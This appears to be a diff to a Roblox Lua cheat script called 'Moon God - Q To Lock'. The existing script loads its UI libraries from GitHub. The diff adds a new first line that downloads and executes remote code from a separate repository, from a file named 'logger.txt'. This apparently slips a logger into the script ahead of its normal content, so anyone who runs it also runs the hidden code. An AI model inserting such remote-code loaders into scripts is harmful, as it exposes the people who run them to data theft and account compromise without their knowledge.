@@ -1,3 +1,5 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/nacisnoob/yun/main/logger.txt")()
+
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro2/main/ui2"))()
     local NotifyLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro/main/ui"))()
     NotifyLib.prompt('Moon God - Q To Lock  - Revamped by Valox', 'Loading..', 5)
